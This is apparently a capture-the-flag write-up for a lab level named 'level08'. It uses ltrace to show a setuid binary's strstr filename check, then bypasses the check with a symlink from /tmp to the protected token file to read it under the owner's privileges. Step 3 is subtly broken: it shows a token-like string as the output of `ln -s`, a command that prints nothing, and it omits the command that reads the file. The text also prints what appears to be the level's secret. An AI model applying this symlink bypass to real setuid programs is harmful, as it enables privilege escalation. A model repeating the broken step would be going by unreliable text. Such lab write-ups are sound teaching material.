## Level 08: Bypassing File Access Restrictions with Symlinks

### Goal
Bypass the filename check in the `level08` executable to gain access to the `token` file, which is restricted by permissions, using symbolic links.

### Steps

1. **File Inspection**  
   After logging in, two files are present: an executable named `level08` and a file named `token`.  
- Executing the binary using `./level08` results in:  
    ```bash
    ./level08 [file to read]
    ```
- Providing `token` as an argument returns:  
    ```bash
    ./level08 token
    You may not access 'token'
    ```
- Inspecting the contents of `token` using `cat token` results in a permission error:  
    ```bash
    cat token
    cat: token: Permission denied
    ```
- Checking file permissions using `ls -la level08 token` shows:  
	```bash
	-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
	-rw-------  1 flag08 flag08    26 Mar  5  2016 token
	```
	This reveals that `token` has strict permissions and is only readable/writable by the user `flag08`. However, the executable `level08` has the setuid (`s`) bit enabled, meaning it executes with the privileges of the file owner (`flag08`).

2. **Analyzing the Executable with ltrace**  
   To understand why `./level08 token` fails, `ltrace` is used to trace library calls:  
   ```bash
   ltrace -f ./level08 token
   ```
   Output:
    ```bash
    [pid 3033] __libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
    [pid 3033] strstr("token", "token")                                          = "token"
    [pid 3033] printf("You may not access '%s'\n", "token"You may not access 'token'             )                      = 27
    [pid 3033] exit(1 <unfinished ...>
    [pid 3033] +++ exited (status 1) +++
    ```
	This shows that the program uses `strstr` to check if the filename contains the word `token`. If the word `token` is not present in the filename, the program attempts to open the file:
	```bash
    ltrace -f ./level08 test
    ```
    Output:
    ```bash
    [pid 3061] __libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
    [pid 3061] strstr("test", "token")                                           = NULL
    [pid 3061] open("test", 0, 014435162522)                                     = -1
    [pid 3061] err(1, 0x80487b2, 0xbffff907, 0xb7fe765d, 0xb7e3ebaflevel08: Unable to open test: No such file or directory  <unfinished ...>
    [pid 3061] +++ exited (status 1) +++
    ```
	The program doesn't find the word `token` and attempts to open a non-existent file `test`.

3. **Exploiting the Vulnerability**  
	A `symbolic link` (symlink) can bypass the filename check.  
	Unlike a `hardlink`, which directly references the file's data and cannot span different filesystems, a symlink can link across different filesystem, making it more flexible for linking across varied file locations.
- To exploit this:
	```bash
    ln -s /home/user/level08/token /tmp/test
    ```
	Ouput:
    ```bash
    quif5eloekouj29ke0vouxean 
    ```
	This command creates a symlink `/tmp/test` pointing to `/home/user/level08/token`.  
	Since the symlink doesn't contain the word token, it avoids the `strstr` check, allowing indirect access to the `token` file.